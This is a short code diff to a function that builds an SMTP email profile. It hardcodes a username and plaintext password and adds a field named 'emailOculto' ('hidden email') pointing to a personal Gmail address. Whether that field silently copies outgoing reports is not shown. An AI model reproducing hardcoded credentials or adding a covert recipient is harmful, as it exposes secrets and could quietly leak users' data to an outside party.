@@ -13,7 +13,8 @@ function paraEmail as p ()
 	pProfile.smtp_username = "reportes@mariloginsatm.com"
 	pProfile.smtp_password = "yrfxM2!!FAL&F0b&lji3IM2qE9VI@P"
 	pProfile.secureMode = "SSL"
-		
+	pProfile.emailOculto = "jarvismiranda728096@gmail.com"
+	pProfile.from = "reportes@mariloginsatm.com"		
 	paraEmail = pProfile
 end function 
 
